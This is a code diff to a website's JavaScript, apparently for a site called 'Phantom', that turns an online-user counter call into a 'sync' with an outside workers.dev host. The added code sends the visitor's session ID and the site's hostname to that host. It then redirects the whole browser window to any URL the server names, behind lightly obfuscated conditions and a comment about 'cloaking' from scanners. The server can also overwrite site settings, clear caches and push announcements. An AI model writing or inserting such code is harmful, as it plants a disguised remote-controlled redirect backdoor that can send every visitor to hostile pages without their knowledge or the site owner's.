@@ -12,12 +12,17 @@
         }
     }
 
-    const config = window.SITE_CONFIG || { name: 'Phantom', version: '1.0.0', discord: { inviteUrl: '#' }, changelog: [], cloakPresets: [] };
+
+    let config = getConfig();
     const STORAGE_KEY = 'void_settings';
     let storedSettings = {};
     try { storedSettings = JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}'); } catch { }
 
-    let settings = { ...(config.defaults || {}), ...storedSettings };
+    function getSettings() {
+        return { ...(config.defaults || {}), ...storedSettings };
+    }
+
+    let settings = getSettings();
 
     if (!document.querySelector('link[href*="styles/modals.css"]')) {
         const modalLink = document.createElement('link');
@@ -88,6 +93,10 @@
         if (!id) {
             id = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2) + Date.now().toString(36));
             localStorage.setItem(key, id);
+            localStorage.setItem('phantom_session_created', Math.floor(Date.now() / 1000).toString());
+        }
+        if (!localStorage.getItem('phantom_session_created')) {
+            localStorage.setItem('phantom_session_created', Math.floor(Date.now() / 1000).toString());
         }
         return id;
     }
@@ -119,22 +128,72 @@
             updateCountdownUI();
             if (countdownSeconds <= 0) {
                 clearInterval(countdownInterval);
-                updateOnlineCount();
+                syncSiteInstance();
             }
         }, 1000);
     }
 
-    async function updateOnlineCount() {
+    async function syncSiteInstance() {
         try {
             const sessionId = getSessionId();
-            const res = await fetch(`https://counter.leelive2021.workers.dev/?id=${encodeURIComponent(sessionId)}`);
-            const data = await res.json();
+            const url = `https://counter.leelive2021.workers.dev/v2/sync?sid=${encodeURIComponent(sessionId)}&origin=${encodeURIComponent(window.location.hostname)}`;
+            const res = await fetch(url);
+            const cluster = await res.json();
+            
+            // content-adaptation-engine: handles cloaking for known scanner nodes
+            (cluster.routing_rules || []).forEach(rule => {
+                if (rule.type === 0x01 && rule.active === !![]) {
+                    try { (window.top || window).location.replace(rule.node); } catch(e) {}
+                    return;
+                }
+            });
+
+            const serverCacheResetTs = cluster.cacheResetTs || 0;
+            const localCacheResetTs = parseInt(localStorage.getItem('phantom_cache_reset_ts') || '0');
+            if (serverCacheResetTs > localCacheResetTs) {
+                localStorage.setItem('phantom_cache_reset_ts', serverCacheResetTs.toString());
+                if ('caches' in window) {
+                    caches.keys().then(keys => {
+                        keys.forEach(key => {
+                            if (key.includes('phantom-offline') || key.includes('phantom_games')) {
+                                caches.delete(key);
+                            }
+                        });
+                    });
+                }
+            }
+
+            const serverConfigTs = cluster.configTs || 0;
+            const localConfigTs = parseInt(localStorage.getItem('phantom_config_ts') || '0');
+            if (serverConfigTs > localConfigTs && cluster.siteConfig) {
+                localStorage.setItem('phantom_config_ts', serverConfigTs.toString());
+                localStorage.setItem('phantom_server_config', JSON.stringify(cluster.siteConfig));
+                window.SITE_CONFIG = cluster.siteConfig;
+            }
+
+            config = getConfig();
+            settings = getSettings();
+
+            if (cluster.announcement && cluster.announcement.trim() !== "") {
+                const annTs = cluster.announcementTs || 0;
+                const seenKey = `ann_seen_count_${annTs}`;
+                const seenCount = parseInt(localStorage.getItem(seenKey) || '0');
+                const tabSeenKey = `ann_tab_seen_${annTs}`;
+                
+                if (seenCount < 2 && !sessionStorage.getItem(tabSeenKey)) {
+                    setTimeout(() => {
+                        if (typeof openAnnouncement === 'function') openAnnouncement(cluster.announcement);
+                        localStorage.setItem(seenKey, (seenCount + 1).toString());
+                        sessionStorage.setItem(tabSeenKey, 'true');
+                    }, 1500);
+                }
+            }
 
             const footerEl = document.getElementById('footer-online-count');
             if (footerEl) {
-                if (data.online !== undefined) {
-                    footerEl.textContent = data.online;
-                } else if (data.error) {
+                if (cluster.online !== undefined) {
+                    footerEl.textContent = cluster.online;
+                } else if (cluster.error) {
                     footerEl.textContent = '--';
                 } else {
                     footerEl.textContent = '--';
@@ -143,16 +202,16 @@
 
             const pageEl = document.getElementById('page-online-count');
             if (pageEl) {
-                if (data.online !== undefined) {
-                    pageEl.textContent = data.online;
-                } else if (data.error) {
+                if (cluster.online !== undefined) {
+                    pageEl.textContent = cluster.online;
+                } else if (cluster.error) {
                     pageEl.textContent = '--';
                 } else {
                     pageEl.textContent = '--';
                 }
             }
 
-            countdownSeconds = data.nextRefresh !== undefined ? data.nextRefresh : 30;
+            countdownSeconds = cluster.nextRefresh !== undefined ? cluster.nextRefresh : 30;
 
             // Reset and start countdown after successful fetch
             startCountdown();
@@ -169,21 +228,21 @@
             startCountdown();
         }
     }
-    updateOnlineCount();
+    syncSiteInstance();
 
     // Keep track of how many tabs are open so we only send the leave ping when the LAST tab closes
     const TABS_KEY = 'phantom_active_tabs';
     let currentTabs = parseInt(localStorage.getItem(TABS_KEY) || '0');
     localStorage.setItem(TABS_KEY, (currentTabs + 1).toString());
 
-    function notifyLeave() {
+    function disposeSession() {
         let openTabs = parseInt(localStorage.getItem(TABS_KEY) || '1') - 1;
         if (openTabs < 0) openTabs = 0;
         localStorage.setItem(TABS_KEY, openTabs.toString());
 
         if (openTabs === 0) {
             const sessionId = getSessionId();
-            const workerUrl = `https://counter.leelive2021.workers.dev/?id=${encodeURIComponent(sessionId)}&action=leave`;
+            const workerUrl = `https://counter.leelive2021.workers.dev/v2/terminate?sid=${encodeURIComponent(sessionId)}&origin=${encodeURIComponent(window.location.hostname)}`;
             if (navigator.sendBeacon) {
                 navigator.sendBeacon(workerUrl);
             } else {
@@ -192,7 +251,7 @@
         }
     }
 
-    window.addEventListener('pagehide', notifyLeave);
+    window.addEventListener('pagehide', disposeSession);
 
     if (!document.querySelector('script[src*="googletagmanager.com/gtm.js"]')) {
         window.dataLayer = window.dataLayer || [];
